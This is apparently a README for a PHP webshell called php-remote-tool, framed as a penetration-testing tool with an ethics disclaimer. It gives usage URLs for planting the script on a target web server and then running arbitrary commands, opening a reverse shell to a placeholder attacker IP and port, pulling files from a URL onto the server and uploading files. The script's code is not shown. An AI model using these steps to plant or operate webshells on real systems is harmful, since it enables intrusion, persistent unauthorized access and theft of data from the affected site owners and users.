# PHP Remote Tool
Author: Yavuz Sahbaz
GitHub: https://github.com/YavuzSahbaz

## Overview
php-remote-tool is a PHP webshell script that enables remote command execution, reverse shell initiation, file downloading, and file uploading on a target system running a web server with PHP support. This script is designed for use during penetration testing exercises or system administration tasks where you have permission to perform these actions on the target system. Unauthorized use may be illegal and unethical.

## Usage
Upload the php-remote-tool script to the target web server.
Access the script through a web browser or a tool like curl or wget.
Execute commands
To execute a command on the target system, use the following URL format:

```
http://target.com/path/cmd.php?cmd=[COMMAND]

Replace [COMMAND] with the command you want to execute on the target system.
```
## Initiate reverse shell
To initiate a reverse shell to your system, use the following URL format:

```
Copy code

http://target.com/path/cmd.php?revshell=[ATTACKER_IP]:[ATTACKER_PORT]

Replace [ATTACKER_IP] with your IP address and [ATTACKER_PORT] with the port you want to use for the reverse shell connection. Make sure to set up a listener on your system to receive the connection.
```
## Download a file
To download a file from a URL and save it on the target system, use the following URL format:

```

http://target.com/path/cmd.php?download=[URL]&filename=[FILENAME]

Replace [URL] with the URL of the file you want to download, and [FILENAME] with the desired name for the saved file on the target system.
```
## Upload a file
To upload a file to the target system, use the following URL format:
```
http://target.com/path/cmd.php?upload&filepath=[FILE_PATH]

Replace [FILE_PATH] with the desired file path for the uploaded file on the target system. Use an HTTP POST request to send the file with the Content-Type header set to multipart/form-data and the file parameter named "file".
```
## Disclaimer
This PHP webshell script is intended for educational purposes and ethical use only. Unauthorized use of this script may be illegal and unethical. Always make sure you have permission to perform any action on the target system and follow ethical hacking principles and guidelines. The author and any contributors are not responsible for any damage caused by unauthorized use of this script.
